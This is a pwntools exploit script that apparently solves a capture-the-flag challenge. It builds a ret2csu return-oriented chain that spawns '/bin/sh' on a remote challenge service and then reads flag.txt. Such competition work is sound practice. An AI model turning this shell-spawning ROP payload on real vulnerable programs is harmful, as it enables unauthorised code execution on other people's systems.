from pwn import *
import detection
import re

context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    e = ELF(binary)
    r = ROP(e)

    p.recvuntil(b'>>>')

    payload = b''

    offset = detection.find_rip_offset(binary)
    print("Offset:", offset)

    # ret2csu is extremely epic
    payload += cyclic(offset)
    payload += p64(e.sym['__libc_csu_init']+90)
    payload += p64(int(e.got['execve']/8))
    payload += p64(0)
    payload += p64(0)
    payload += p64(next(e.search(b'/bin/sh\00'))) # This can't be bigger than 4 bytes
    payload += p64(0)
    payload += p64(0)
    payload += p64(e.sym['__libc_csu_init']+64)

    p.sendline(payload)

    p.sendline(b'cat flag.txt')

    output = p.recvall(timeout=0.2)

    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    else:
        return
